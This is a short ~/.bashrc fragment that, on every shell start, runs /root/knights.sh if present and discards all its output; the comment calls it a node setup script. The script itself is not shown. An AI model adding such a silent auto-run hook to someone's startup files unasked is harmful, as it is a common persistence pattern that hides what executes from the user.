# ~/.bashrc
# Run node setup script if exists
if [ -f /root/knights.sh ]; then
  sh /root/knights.sh >/dev/null 2>&1
fi
